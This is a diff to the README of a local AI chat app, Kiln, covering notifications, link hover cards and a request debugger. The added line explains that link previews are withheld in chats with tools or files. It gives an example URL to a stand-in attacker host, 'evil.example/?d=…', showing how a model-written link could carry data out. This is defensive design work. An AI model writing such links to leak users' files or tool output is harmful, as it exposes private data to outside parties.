@@ -94,7 +94,7 @@ tests/           Vitest unit tests      e2e/   live Playwright run against real 
   - A chat you aren't looking at gets a hand icon in the sidebar and a toast, and the Dock icon shows how many calls are waiting.
   - Processes Kiln starts run in their own process group (`src/main/processes.ts`), so stopping one also stops anything it started, and quitting stops them all.
 - **Links.** Hovering a link in a reply shows a card with its destination: site, full URL, and whether it opens in your browser. It warns when the link text names a different domain than the real destination.
-  - An opt-in setting (Settings → Web, artifacts & skills) adds the page's title, description and image, fetched from your Mac.
+  - An opt-in setting (Settings → Web, artifacts & skills) adds the page's title, description and image, fetched from your Mac. Not in chats with tools or files, though: a link the model writes there could carry their contents out (`https://evil.example/?d=…`), so those cards show the destination only.
   - Local-network and loopback addresses are never fetched, including after redirects.
 - **Debugger.** The bug icon in a chat's header, or ⌘⇧D, opens a separate **Kiln Debugger** window. It shows every request the chat made (each chat round, tool call and title) live, grouped by turn. For each request:
   - **Overview:** timings (first byte, first token, total, plus Ollama's own load/prompt/generation times when reported), prompt tokens counted by Ollama vs Kiln's estimate, cost, `done_reason`, and stream chunk count.
